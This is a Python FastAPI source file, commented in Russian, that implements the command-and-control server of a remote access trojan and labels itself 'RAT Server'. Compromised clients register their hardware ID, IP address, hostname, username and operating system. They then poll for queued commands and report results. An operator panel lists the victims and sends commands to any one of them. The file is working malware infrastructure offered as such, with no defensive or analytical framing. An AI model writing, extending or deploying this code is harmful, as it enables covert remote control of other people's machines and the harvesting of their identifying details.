import os
import json
import time
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from typing import Dict, List, Optional

app = FastAPI()

# Хранилище клиентов (в памяти, но при перезагрузке сбрасывается)
clients: Dict[str, dict] = {}  # hwid -> {ip, hostname, username, os, last_seen}
pending_commands: Dict[str, List[dict]] = {}  # hwid -> [command1, command2, ...]

class ClientInfo(BaseModel):
    hwid: str
    ip: str
    hostname: str
    username: str
    os: str

class CommandRequest(BaseModel):
    target: str
    command: dict

@app.get("/")
async def index():
    return {"status": "OK", "service": "RAT Server"}

@app.get("/health")
async def health():
    return {"status": "healthy"}

@app.post("/client/register")
async def register_client(info: ClientInfo):
    """Клиент регистрируется на сервере"""
    clients[info.hwid] = {
        "ip": info.ip,
        "hostname": info.hostname,
        "username": info.username,
        "os": info.os,
        "last_seen": time.time()
    }
    if info.hwid not in pending_commands:
        pending_commands[info.hwid] = []
    return {"status": "ok", "message": "Client registered"}

@app.get("/client/poll")
async def poll_commands(hwid: str):
    """Клиент получает команды (опрос)"""
    if hwid not in clients:
        raise HTTPException(status_code=404, detail="Client not found")
    
    # Обновляем время последнего обращения
    clients[hwid]["last_seen"] = time.time()
    
    # Получаем команды для клиента
    commands = pending_commands.get(hwid, [])
    pending_commands[hwid] = []  # Очищаем после получения
    
    return {"commands": commands}

@app.post("/client/result")
async def client_result(data: dict):
    """Клиент отправляет результат выполнения команды"""
    # Здесь можно сохранять результат для панели
    hwid = data.get("hwid")
    result = data.get("result", {})
    return {"status": "ok"}

@app.get("/clients")
async def get_clients():
    """Панель получает список клиентов"""
    return list(clients.values())

@app.post("/command")
async def send_command(req: CommandRequest):
    """Панель отправляет команду клиенту"""
    if req.target not in clients:
        raise HTTPException(status_code=404, detail="Client not found")
    
    if req.target not in pending_commands:
        pending_commands[req.target] = []
    
    pending_commands[req.target].append(req.command)
    return {"status": "ok", "message": "Command queued"}
